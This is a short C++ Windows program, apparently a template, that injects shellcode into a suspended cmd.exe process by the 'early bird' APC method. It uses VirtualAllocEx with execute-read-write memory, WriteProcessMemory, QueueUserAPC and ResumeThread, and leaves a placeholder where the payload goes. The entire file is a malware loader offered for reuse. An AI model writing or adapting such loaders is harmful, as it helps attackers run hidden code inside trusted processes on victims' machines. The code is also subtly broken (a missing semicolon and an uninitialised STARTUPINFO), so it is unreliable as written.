#include <iostream>
#include <string>
#include <Windows.h>

int main(){
	
	char shellcode[] = "//your shellcode here";
	
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE thread=NULL;
	LPVOID remote_addr = NULL;
	HANDLE proc_handle=NULL
	
	CreateProcessA(NULL,"cmd.exe",NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&si,&pi);

	proc_handle = pi.hProcess;
	remote_addr = VirtualAllocEx(proc_handle,NULL,sizeof shellcode,MEM_COMMIT| MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remote_addr;
	
	WriteProcessMemory(proc_handle,remote_addr,shellcode,sizeof shellcode,NULL);
	
	thread=pi.hThread;
	
	QueueUserAPC((PAPCFUNC)apcRoutine,thread,NULL);
	
	ResumeThread(thread);
	
	return 0;
}
